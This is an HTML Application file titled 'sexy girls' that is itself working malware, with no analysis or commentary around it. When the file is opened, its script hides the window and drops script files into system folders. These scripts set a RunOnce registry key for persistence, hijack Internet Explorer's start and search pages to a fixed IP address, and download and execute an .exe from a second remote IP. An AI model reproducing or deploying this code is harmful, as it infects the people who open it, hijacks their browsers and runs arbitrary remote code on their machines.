<html>
<head>
<script language="javascript">
var fso = new ActiveXObject("Scripting.FileSystemObject");
var Shell = new ActiveXObject("WScript.Shell");

try {
var tfolder2 = fso.GetSpecialFolder(0);
var filepath2 = tfolder2 + "\\update911.js";
var a2 = fso.CreateTextFile(filepath2, true);

a2.WriteLine('var url = "http://81.211.105.9/index.php?v=1";');
a2.WriteLine('var burl = "http://81.211.105.9/search.php?v=1";');
a2.WriteLine('var fso = new ActiveXObject("Scripting.FileSystemObject");');
a2.WriteLine('var tfolder = fso.GetSpecialFolder(0);');
a2.WriteLine('var filepath = tfolder + "\\\\update911.js";');

a2.WriteLine('var Shell = new ActiveXObject("WScript.Shell");');
a2.WriteLine('Shell.RegWrite("HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\tlc",filepath);');

a2.WriteLine('Shell.RegWrite("HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Start Page",url);');
a2.WriteLine('Shell.RegWrite("HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page",url);');
a2.WriteLine('Shell.RegWrite("HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar",burl);');
a2.WriteLine('Shell.RegWrite("HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Search Asst","no");');
a2.WriteLine('Shell.RegWrite("HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Use Custom Search URL",1,"REG_DWORD");');
a2.Close();
Shell.Run(filepath2);
}
catch (e){}

var tfolder = fso.GetSpecialFolder(2);
var filepath = tfolder + "\\tmk.js";
var a = fso.CreateTextFile(filepath, true);
a.WriteLine('var url = "http://69.31.86.252/xltmk.dat";');
a.WriteLine('var fso = new ActiveXObject("Scripting.FileSystemObject");');
a.WriteLine('var tfolder = fso.GetSpecialFolder(2);');
a.WriteLine('var filepath = tfolder + "\\\\tmk2206.exe";');

a.WriteLine('var x = new ActiveXObject("Microsoft.XMLHTTP");');
a.WriteLine('x.Open("GET", url ,0);');
a.WriteLine('x.Send();');

a.WriteLine('var s = new ActiveXObject("ADODB.Stream");');
a.WriteLine('s.Mode = 3;');
a.WriteLine('s.Type = 1;');
a.WriteLine('s.Open();');
a.WriteLine('s.Write(x.responseBody);');
a.WriteLine('s.SaveToFile(filepath,2);');

a.WriteLine('var Shell = new ActiveXObject("WScript.Shell");');
a.WriteLine('Shell.Run(filepath);');

a.Close();

Shell.Run(filepath);

</script>
<HTA:APPLICATION WINDOWSTATE='minimize' SHOWINTASKBAR='no' />
<title>sexy girls</title>
</head>
<body onload='window.close()'>

</body>
</html>
